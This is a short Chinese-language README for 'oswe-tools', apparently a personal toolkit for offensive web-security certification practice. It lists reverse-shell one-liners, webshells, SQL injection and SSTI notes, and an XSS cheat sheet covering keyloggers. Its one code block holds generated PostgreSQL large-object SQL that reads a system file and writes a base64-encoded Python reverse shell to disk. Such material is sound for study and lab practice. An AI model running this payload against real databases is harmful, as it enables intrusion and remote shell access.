# oswe-tools

## debugger

一些設定 / 簡易指令, 第一次使用就上手.

## revshells

一句話反連指令, 有多種語言

`pty_shell_handler.py` 是從 [這裡](https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_shell_handler.py) 取得的, 把 pty shell 升級成可以 `ctrl^c` 的完整shell


## sqli

自己刻的BST Boolean-based SQLi

Postgresql Large Object 的 SQL 語法產生器
```sql
$ python sqli/pgsql/generate_sql.py --noloid --upload revshells/r.py -p d:/go.py 
select lo_import( 'c:/windows/win.ini', (select case when count (*) > 0 then MAX(CAST(loid as int))+1 else 1337 end from pg_largeobject));
with LL as (select MAX(CAST(loid as int)) as gg from pg_largeobject) update pg_largeobject set data=decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyNy4wLjAuMSIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vYmFzaCIpCg==', 'base64') from LL where loid=LL.gg and pageno=0;
select lo_export((select MAX(CAST(loid as int)) as gg from pg_largeobject), 'd:/go.py');
select lo_unlink((select MAX(CAST(loid as int)) as gg from pg_largeobject));
```

## ssti

練習時有遇到的 SSTI, 記錄簡單復現方式

## jars

好用的 Java 工具

## webshells

簡易網頁木馬

## InterpretCode

交互式測試多種程式語言的 cheatsheet.

## utils

小工具, 不知道怎麼分類就放這

## XSS.md

編寫 XSS 攻擊時的大抄, 包含 js-api, fetch Auth pages, keylogger ...
